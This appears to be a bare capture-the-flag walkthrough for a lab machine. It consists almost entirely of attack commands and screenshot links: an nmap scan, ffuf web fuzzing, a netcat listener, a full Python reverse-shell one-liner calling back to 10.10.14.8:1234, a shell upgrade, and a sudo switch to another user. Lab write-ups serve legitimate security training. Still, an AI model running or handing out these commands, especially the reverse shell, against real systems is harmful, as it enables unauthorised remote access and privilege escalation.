```
nmap -sS -sC -sV -T5 -Pn 10.10.10.68
```
![image](https://user-images.githubusercontent.com/33616880/231078057-77c3fa36-7209-4521-8619-dacbe002e5e0.png)


![image](https://user-images.githubusercontent.com/33616880/231078885-d693a7c8-64c3-4d4d-8792-30f38a714312.png)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
```
![image](https://user-images.githubusercontent.com/33616880/231078144-85f18b51-a11c-4111-8827-4e1957812732.png)


![image](https://user-images.githubusercontent.com/33616880/231079195-c3821e9c-f4e0-45b6-944d-696a708a6df7.png)


https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux


```
nc -nlvp 1234
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![image](https://user-images.githubusercontent.com/33616880/231055113-1d7b8689-2d39-468a-bf6d-6c5f0a63926c.png)
![image](https://user-images.githubusercontent.com/33616880/231055372-e58304c2-36da-4de5-a9a3-76599f6bf2a9.png)


```
python3 -c "import pty;pty.spawn('/bin/bash')"
```
```
sudo -u scriptmanager bash -i
```
